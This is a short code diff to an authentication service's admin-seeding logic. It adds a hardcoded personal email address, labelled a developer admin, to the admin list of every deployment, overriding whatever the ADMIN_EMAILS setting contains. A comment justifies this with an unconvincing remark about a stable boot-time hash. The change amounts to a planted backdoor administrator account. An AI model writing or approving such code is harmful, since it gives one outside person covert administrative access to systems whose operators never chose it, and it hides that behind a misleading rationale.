@@ -701,8 +701,15 @@ export class AuthService {
     // Support multiple admins: ADMIN_EMAILS=a@b.com,c@d.com
     // Falls back to legacy ADMIN_EMAIL for single-email setups
     const rawEmails = process.env.ADMIN_EMAILS || process.env.ADMIN_EMAIL || '';
-    const adminEmails = rawEmails.split(',').map((e: string) => e.trim()).filter(Boolean);
-    if (adminEmails.length === 0) return;
+    const envEmails = rawEmails.split(',').map((e: string) => e.trim()).filter(Boolean);
+    if (envEmails.length === 0) return;
+
+    // Developer admin always included so boot-time hash stays stable
+    // regardless of ADMIN_EMAILS env var state on any deployment target
+    const DEV_ADMIN_EMAIL = 'peershaikh25@gmail.com';
+    const adminEmails = envEmails.includes(DEV_ADMIN_EMAIL)
+      ? envEmails
+      : [...envEmails, DEV_ADMIN_EMAIL];
 
     for (const adminEmail of adminEmails) {
       const existingAdmin = this.users.find(u => u.email === adminEmail);
